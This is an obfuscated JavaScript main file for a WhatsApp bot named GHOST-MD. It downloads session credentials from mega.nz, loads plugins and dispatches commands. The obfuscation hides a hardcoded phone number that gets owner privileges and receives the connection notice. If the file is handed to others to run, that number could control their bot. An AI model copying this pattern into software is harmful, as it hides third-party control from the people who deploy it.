const _0x1040ec=_0x4499;function _0x2578(){const _0xa127e7=['remoteJid','util','pattern','react','express','audio/mpeg','close','./config','groupMetadata','megajs','938651gjWqfG','./lib/mongodb','length','extendedTextMessage','pino','shift','videoMessage','path','AUTO_READ_STATUS','true','quotedMessage','loggedOut','log','Session\x20downloaded\x20✅','285sJDaXh','content-type','statusCode','[PLUGIN\x20ERROR]\x20','@g.us','Bot\x20connected\x20to\x20whatsapp\x20✅','Please\x20add\x20your\x20session\x20to\x20SESSION_ID\x20env\x20!!','stringify','20MOOGaT','groups','text','252501EkqyKo','message','4429601fSypIG','https://telegra.ph/file/397000a07a1deb7fad9c2.jpg','split','ephemeralMessage','PREFIX','MODE','gif','@s.whatsapp.net','862188ETwqdy','send','participant','listen','Plugins\x20installed\x20successful\x20✅','extname','toLowerCase','commands','contextInfo','type','body','status@broadcast','imageMessage','application/pdf','34480764AuqDTx','head','messages.upsert','env','get','user','conversation','stickerMessage','download','photo','connection.update','caption','*GHOST-MD\x20connected\x20successful\x20✅*\x0a\x0a*PREFIX:*\x20','video/mp4','93176QAvlfk','@whiskeysockets/baileys','join','sticker','38856GaPgNg','./plugins/','/auth_info_baileys/','messages','Server\x20listening\x20on\x20port\x20http://localhost:','startsWith','creds.update','qrcode-terminal','https://mega.nz/file/','fromMe','.js','image','😼\x20Installing...\x20','error','./lib/database','axios','silent','SESSION_ID','Firefox','key','includes','map','6QeUwxt','94787438929','26odsSuL','slice','936lYBQlX','./command','Message','PORT','headers','audio','reactionMessage','find','trim','function','/auth_info_baileys/creds.json','sendMessage'];_0x2578=function(){return _0xa127e7;};return _0x2578();}function _0x4499(_0x236c6e,_0x2c95c2){const _0x257822=_0x2578();return _0x4499=function(_0x44995b,_0x3a5c56){_0x44995b=_0x44995b-0x134;let _0x26fded=_0x257822[_0x44995b];return _0x26fded;},_0x4499(_0x236c6e,_0x2c95c2);}(function(_0x5686e7,_0x322eaf){const _0x467828=_0x4499,_0x1cc454=_0x5686e7();while(!![]){try{const _0x572f98=-parseInt(_0x467828(0x153))/0x1+parseInt(_0x467828(0x18b))/0x2*(-parseInt(_0x467828(0x149))/0x3)+-parseInt(_0x467828(0x16f))/0x4*(-parseInt(_0x467828(0x13e))/0x5)+parseInt(_0x467828(0x189))/0x6*(-parseInt(_0x467828(0x1a3))/0x7)+parseInt(_0x467828(0x173))/0x8*(-parseInt(_0x467828(0x18d))/0x9)+-parseInt(_0x467828(0x146))/0xa*(parseInt(_0x467828(0x14b))/0xb)+parseInt(_0x467828(0x161))/0xc;if(_0x572f98===_0x322eaf)break;else _0x1cc454['push'](_0x1cc454['shift']());}catch(_0x35be69){_0x1cc454['push'](_0x1cc454['shift']());}}}(_0x2578,0xc35c1));const {default:makeWASocket,useMultiFileAuthState,DisconnectReason,jidNormalizedUser,getContentType,fetchLatestBaileysVersion,Browsers}=require(_0x1040ec(0x170)),l=console[_0x1040ec(0x13c)],{getBuffer,getGroupAdmins,getRandom,h2k,isUrl,Json,runtime,sleep,fetchJson}=require('./lib/functions'),fs=require('fs'),P=require(_0x1040ec(0x134)),config=require(_0x1040ec(0x1a0)),qrcode=require(_0x1040ec(0x17a)),util=require(_0x1040ec(0x19a)),{sms,downloadMediaMessage}=require('./lib/msg'),axios=require(_0x1040ec(0x182)),{File}=require(_0x1040ec(0x1a2)),ownerNumber=['94741140620'];if(!fs['existsSync'](__dirname+_0x1040ec(0x197))){if(!config['SESSION_ID'])return console[_0x1040ec(0x13c)](_0x1040ec(0x144));const sessdata=config[_0x1040ec(0x184)],filer=File['fromURL'](_0x1040ec(0x17b)+sessdata);filer[_0x1040ec(0x169)]((_0x29bc84,_0x2d0185)=>{const _0x39a564=_0x1040ec;if(_0x29bc84)throw _0x29bc84;fs['writeFile'](__dirname+_0x39a564(0x197),_0x2d0185,()=>{const _0x252ca=_0x39a564;console[_0x252ca(0x13c)](_0x252ca(0x13d));});});}const express=require(_0x1040ec(0x19d)),app=express(),port=process[_0x1040ec(0x164)][_0x1040ec(0x190)]||0x1f40;async function connectToWA(){const _0x3dc463=_0x1040ec,_0x34fd7b=require(_0x3dc463(0x1a4));_0x34fd7b();const {readEnv:_0x453b0c}=require(_0x3dc463(0x181)),_0x1d5bf8=await _0x453b0c(),_0x115509=_0x1d5bf8[_0x3dc463(0x14f)];console[_0x3dc463(0x13c)]('Connecting\x20GHOST-MD\x20🧬...');const {state:_0x400eee,saveCreds:_0x145a53}=await useMultiFileAuthState(__dirname+_0x3dc463(0x175));var {version:_0x3d1da2}=await fetchLatestBaileysVersion();const _0x5abb0c=makeWASocket({'logger':P({'level':_0x3dc463(0x183)}),'printQRInTerminal':![],'browser':Browsers['macOS'](_0x3dc463(0x185)),'syncFullHistory':!![],'auth':_0x400eee,'version':_0x3d1da2});_0x5abb0c['ev']['on'](_0x3dc463(0x16b),_0x57b9c6=>{const _0x536b38=_0x3dc463,{connection:_0x5e3e8a,lastDisconnect:_0x241fe2}=_0x57b9c6;if(_0x5e3e8a===_0x536b38(0x19f))_0x241fe2[_0x536b38(0x180)]['output'][_0x536b38(0x140)]!==DisconnectReason[_0x536b38(0x13b)]&&connectToWA();else{if(_0x5e3e8a==='open'){console[_0x536b38(0x13c)](_0x536b38(0x17f));const _0xf9472b=require(_0x536b38(0x137));fs['readdirSync']('./plugins/')['forEach'](_0xda4db5=>{const _0x88a2b2=_0x536b38;_0xf9472b[_0x88a2b2(0x158)](_0xda4db5)['toLowerCase']()==_0x88a2b2(0x17d)&&require(_0x88a2b2(0x174)+_0xda4db5);}),console[_0x536b38(0x13c)](_0x536b38(0x157)),console['log'](_0x536b38(0x143));let _0x3020d4=_0x536b38(0x16d)+_0x115509+'\x20';_0x5abb0c[_0x536b38(0x198)](ownerNumber+_0x536b38(0x152),{'image':{'url':_0x536b38(0x14c)},'caption':_0x3020d4});}}}),_0x5abb0c['ev']['on'](_0x3dc463(0x179),_0x145a53),_0x5abb0c['ev']['on'](_0x3dc463(0x163),async _0x4aee7d=>{const _0x5eb040=_0x3dc463;_0x4aee7d=_0x4aee7d[_0x5eb040(0x176)][0x0];if(!_0x4aee7d[_0x5eb040(0x14a)])return;_0x4aee7d[_0x5eb040(0x14a)]=getContentType(_0x4aee7d[_0x5eb040(0x14a)])===_0x5eb040(0x14e)?_0x4aee7d[_0x5eb040(0x14a)][_0x5eb040(0x14e)][_0x5eb040(0x14a)]:_0x4aee7d[_0x5eb040(0x14a)];_0x4aee7d[_0x5eb040(0x186)]&&_0x4aee7d[_0x5eb040(0x186)][_0x5eb040(0x199)]===_0x5eb040(0x15e)&&_0x1d5bf8[_0x5eb040(0x138)]===_0x5eb040(0x139)&&await _0x5abb0c['readMessages']([_0x4aee7d[_0x5eb040(0x186)]]);const _0x235723=sms(_0x5abb0c,_0x4aee7d),_0x1c1f39=getContentType(_0x4aee7d[_0x5eb040(0x14a)]),_0x3a7eb4=JSON[_0x5eb040(0x145)](_0x4aee7d[_0x5eb040(0x14a)]),_0x300ab1=_0x4aee7d[_0x5eb040(0x186)][_0x5eb040(0x199)],_0x254f77=_0x1c1f39==_0x5eb040(0x1a6)&&_0x4aee7d[_0x5eb040(0x14a)]['extendedTextMessage'][_0x5eb040(0x15b)]!=null?_0x4aee7d[_0x5eb040(0x14a)][_0x5eb040(0x1a6)][_0x5eb040(0x15b)][_0x5eb040(0x13a)]||[]:[],_0x5857a2=_0x1c1f39===_0x5eb040(0x167)?_0x4aee7d['message'][_0x5eb040(0x167)]:_0x1c1f39===_0x5eb040(0x1a6)?_0x4aee7d[_0x5eb040(0x14a)][_0x5eb040(0x1a6)][_0x5eb040(0x148)]:_0x1c1f39==_0x5eb040(0x15f)&&_0x4aee7d[_0x5eb040(0x14a)]['imageMessage'][_0x5eb040(0x16c)]?_0x4aee7d[_0x5eb040(0x14a)][_0x5eb040(0x15f)][_0x5eb040(0x16c)]:_0x1c1f39==_0x5eb040(0x136)&&_0x4aee7d[_0x5eb040(0x14a)][_0x5eb040(0x136)][_0x5eb040(0x16c)]?_0x4aee7d['message']['videoMessage'][_0x5eb040(0x16c)]:'',_0x2daa50=_0x5857a2[_0x5eb040(0x178)](_0x115509),_0x79d764=_0x2daa50?_0x5857a2[_0x5eb040(0x18c)](_0x115509[_0x5eb040(0x1a5)])[_0x5eb040(0x195)]()[_0x5eb040(0x14d)]('\x20')[_0x5eb040(0x135)]()[_0x5eb040(0x159)]():'',_0x3fe668=_0x5857a2[_0x5eb040(0x195)]()[_0x5eb040(0x14d)](/ +/)['slice'](0x1),_0x334367=_0x3fe668[_0x5eb040(0x171)]('\x20'),_0x17d624=_0x300ab1['endsWith'](_0x5eb040(0x142)),_0x46ca74=_0x4aee7d[_0x5eb040(0x186)][_0x5eb040(0x17c)]?_0x5abb0c[_0x5eb040(0x166)]['id']['split'](':')[0x0]+_0x5eb040(0x152)||_0x5abb0c[_0x5eb040(0x166)]['id']:_0x4aee7d[_0x5eb040(0x186)][_0x5eb040(0x155)]||_0x4aee7d[_0x5eb040(0x186)][_0x5eb040(0x199)],_0x1f9aa6=_0x46ca74[_0x5eb040(0x14d)]('@')[0x0],_0x5857e1=_0x5abb0c[_0x5eb040(0x166)]['id']['split'](':')[0x0],_0xd4bf90=_0x4aee7d['pushName']||'Sin\x20Nombre',_0x54fb8a=_0x5857e1[_0x5eb040(0x187)](_0x1f9aa6),_0x3fee49=ownerNumber['includes'](_0x1f9aa6)||_0x54fb8a,_0x3a2b41=await jidNormalizedUser(_0x5abb0c[_0x5eb040(0x166)]['id']),_0x699b6c=_0x17d624?await _0x5abb0c[_0x5eb040(0x1a1)](_0x300ab1)['catch'](_0x3734c7=>{}):'',_0x3f6ff2=_0x17d624?_0x699b6c['subject']:'',_0x146042=_0x17d624?await _0x699b6c['participants']:'',_0x4e4e34=_0x17d624?await getGroupAdmins(_0x146042):'',_0x43cad2=_0x17d624?_0x4e4e34['includes'](_0x3a2b41):![],_0x2c5397=_0x17d624?_0x4e4e34['includes'](_0x46ca74):![],_0x308e8e=_0x235723[_0x5eb040(0x14a)][_0x5eb040(0x193)]?!![]:![],_0x36d479=_0x4322a2=>{const _0xffcfa9=_0x5eb040;_0x5abb0c[_0xffcfa9(0x198)](_0x300ab1,{'text':_0x4322a2},{'quoted':_0x4aee7d});};_0x5abb0c['sendFileUrl']=async(_0x458f9c,_0x5a5a0e,_0x524edb,_0x247917,_0x5791fc={})=>{const _0xd79dfc=_0x5eb040;let _0x544cb4='',_0xeef2d5=await axios[_0xd79dfc(0x162)](_0x5a5a0e);_0x544cb4=_0xeef2d5[_0xd79dfc(0x191)][_0xd79dfc(0x13f)];if(_0x544cb4['split']('/')[0x1]===_0xd79dfc(0x151))return _0x5abb0c['sendMessage'](_0x458f9c,{'video':await getBuffer(_0x5a5a0e),'caption':_0x524edb,'gifPlayback':!![],..._0x5791fc},{'quoted':_0x247917,..._0x5791fc});let _0x595555=_0x544cb4[_0xd79dfc(0x14d)]('/')[0x0]+_0xd79dfc(0x18f);if(_0x544cb4===_0xd79dfc(0x160))return _0x5abb0c[_0xd79dfc(0x198)](_0x458f9c,{'document':await getBuffer(_0x5a5a0e),'mimetype':'application/pdf','caption':_0x524edb,..._0x5791fc},{'quoted':_0x247917,..._0x5791fc});if(_0x544cb4[_0xd79dfc(0x14d)]('/')[0x0]===_0xd79dfc(0x17e))return _0x5abb0c[_0xd79dfc(0x198)](_0x458f9c,{'image':await getBuffer(_0x5a5a0e),'caption':_0x524edb,..._0x5791fc},{'quoted':_0x247917,..._0x5791fc});if(_0x544cb4[_0xd79dfc(0x14d)]('/')[0x0]==='video')return _0x5abb0c['sendMessage'](_0x458f9c,{'video':await getBuffer(_0x5a5a0e),'caption':_0x524edb,'mimetype':_0xd79dfc(0x16e),..._0x5791fc},{'quoted':_0x247917,..._0x5791fc});if(_0x544cb4[_0xd79dfc(0x14d)]('/')[0x0]===_0xd79dfc(0x192))return _0x5abb0c[_0xd79dfc(0x198)](_0x458f9c,{'audio':await getBuffer(_0x5a5a0e),'caption':_0x524edb,'mimetype':_0xd79dfc(0x19e),..._0x5791fc},{'quoted':_0x247917,..._0x5791fc});};if(_0x1f9aa6['includes']('94741140620')){if(_0x308e8e)return;_0x235723[_0x5eb040(0x19c)]('👻');}if(_0x1f9aa6[_0x5eb040(0x187)](_0x5eb040(0x18a))){if(_0x308e8e)return;_0x235723['react']('👻');}if(!_0x3fee49&&_0x1d5bf8['MODE']==='private')return;if(!_0x3fee49&&_0x17d624&&_0x1d5bf8[_0x5eb040(0x150)]==='inbox')return;if(!_0x3fee49&&!_0x17d624&&_0x1d5bf8[_0x5eb040(0x150)]===_0x5eb040(0x147))return;const _0x16ff32=require(_0x5eb040(0x18e)),_0x19a1a7=_0x2daa50?_0x5857a2['slice'](0x1)['trim']()[_0x5eb040(0x14d)]('\x20')[0x0][_0x5eb040(0x159)]():![];if(_0x2daa50){const _0x1f82a8=_0x16ff32[_0x5eb040(0x15a)][_0x5eb040(0x194)](_0x115d8e=>_0x115d8e[_0x5eb040(0x19b)]===_0x19a1a7)||_0x16ff32[_0x5eb040(0x15a)][_0x5eb040(0x194)](_0x3f78d5=>_0x3f78d5['alias']&&_0x3f78d5['alias'][_0x5eb040(0x187)](_0x19a1a7));if(_0x1f82a8){if(_0x1f82a8['react'])_0x5abb0c['sendMessage'](_0x300ab1,{'react':{'text':_0x1f82a8['react'],'key':_0x4aee7d[_0x5eb040(0x186)]}});try{_0x1f82a8[_0x5eb040(0x196)](_0x5abb0c,_0x4aee7d,_0x235723,{'from':_0x300ab1,'quoted':_0x254f77,'body':_0x5857a2,'isCmd':_0x2daa50,'command':_0x79d764,'args':_0x3fe668,'q':_0x334367,'isGroup':_0x17d624,'sender':_0x46ca74,'senderNumber':_0x1f9aa6,'botNumber2':_0x3a2b41,'botNumber':_0x5857e1,'pushname':_0xd4bf90,'isMe':_0x54fb8a,'isOwner':_0x3fee49,'groupMetadata':_0x699b6c,'groupName':_0x3f6ff2,'participants':_0x146042,'groupAdmins':_0x4e4e34,'isBotAdmins':_0x43cad2,'isAdmins':_0x2c5397,'reply':_0x36d479});}catch(_0x1ada0d){console[_0x5eb040(0x180)](_0x5eb040(0x141)+_0x1ada0d);}}}_0x16ff32['commands'][_0x5eb040(0x188)](async _0x340cd4=>{const _0x3f23da=_0x5eb040;if(_0x5857a2&&_0x340cd4['on']===_0x3f23da(0x15d))_0x340cd4[_0x3f23da(0x196)](_0x5abb0c,_0x4aee7d,_0x235723,{'from':_0x300ab1,'l':l,'quoted':_0x254f77,'body':_0x5857a2,'isCmd':_0x2daa50,'command':_0x340cd4,'args':_0x3fe668,'q':_0x334367,'isGroup':_0x17d624,'sender':_0x46ca74,'senderNumber':_0x1f9aa6,'botNumber2':_0x3a2b41,'botNumber':_0x5857e1,'pushname':_0xd4bf90,'isMe':_0x54fb8a,'isOwner':_0x3fee49,'groupMetadata':_0x699b6c,'groupName':_0x3f6ff2,'participants':_0x146042,'groupAdmins':_0x4e4e34,'isBotAdmins':_0x43cad2,'isAdmins':_0x2c5397,'reply':_0x36d479});else{if(_0x4aee7d['q']&&_0x340cd4['on']===_0x3f23da(0x148))_0x340cd4['function'](_0x5abb0c,_0x4aee7d,_0x235723,{'from':_0x300ab1,'l':l,'quoted':_0x254f77,'body':_0x5857a2,'isCmd':_0x2daa50,'command':_0x340cd4,'args':_0x3fe668,'q':_0x334367,'isGroup':_0x17d624,'sender':_0x46ca74,'senderNumber':_0x1f9aa6,'botNumber2':_0x3a2b41,'botNumber':_0x5857e1,'pushname':_0xd4bf90,'isMe':_0x54fb8a,'isOwner':_0x3fee49,'groupMetadata':_0x699b6c,'groupName':_0x3f6ff2,'participants':_0x146042,'groupAdmins':_0x4e4e34,'isBotAdmins':_0x43cad2,'isAdmins':_0x2c5397,'reply':_0x36d479});else{if((_0x340cd4['on']==='image'||_0x340cd4['on']===_0x3f23da(0x16a))&&_0x4aee7d[_0x3f23da(0x15c)]==='imageMessage')_0x340cd4[_0x3f23da(0x196)](_0x5abb0c,_0x4aee7d,_0x235723,{'from':_0x300ab1,'l':l,'quoted':_0x254f77,'body':_0x5857a2,'isCmd':_0x2daa50,'command':_0x340cd4,'args':_0x3fe668,'q':_0x334367,'isGroup':_0x17d624,'sender':_0x46ca74,'senderNumber':_0x1f9aa6,'botNumber2':_0x3a2b41,'botNumber':_0x5857e1,'pushname':_0xd4bf90,'isMe':_0x54fb8a,'isOwner':_0x3fee49,'groupMetadata':_0x699b6c,'groupName':_0x3f6ff2,'participants':_0x146042,'groupAdmins':_0x4e4e34,'isBotAdmins':_0x43cad2,'isAdmins':_0x2c5397,'reply':_0x36d479});else _0x340cd4['on']===_0x3f23da(0x172)&&_0x4aee7d[_0x3f23da(0x15c)]===_0x3f23da(0x168)&&_0x340cd4['function'](_0x5abb0c,_0x4aee7d,_0x235723,{'from':_0x300ab1,'l':l,'quoted':_0x254f77,'body':_0x5857a2,'isCmd':_0x2daa50,'command':_0x340cd4,'args':_0x3fe668,'q':_0x334367,'isGroup':_0x17d624,'sender':_0x46ca74,'senderNumber':_0x1f9aa6,'botNumber2':_0x3a2b41,'botNumber':_0x5857e1,'pushname':_0xd4bf90,'isMe':_0x54fb8a,'isOwner':_0x3fee49,'groupMetadata':_0x699b6c,'groupName':_0x3f6ff2,'participants':_0x146042,'groupAdmins':_0x4e4e34,'isBotAdmins':_0x43cad2,'isAdmins':_0x2c5397,'reply':_0x36d479});}}});});}app[_0x1040ec(0x165)]('/',(_0x1013f4,_0x2c3866)=>{const _0x578b03=_0x1040ec;_0x2c3866[_0x578b03(0x154)]('hey,\x20bot\x20started✅');}),app[_0x1040ec(0x156)](port,()=>console[_0x1040ec(0x13c)](_0x1040ec(0x177)+port)),setTimeout(()=>{connectToWA();},0xfa0);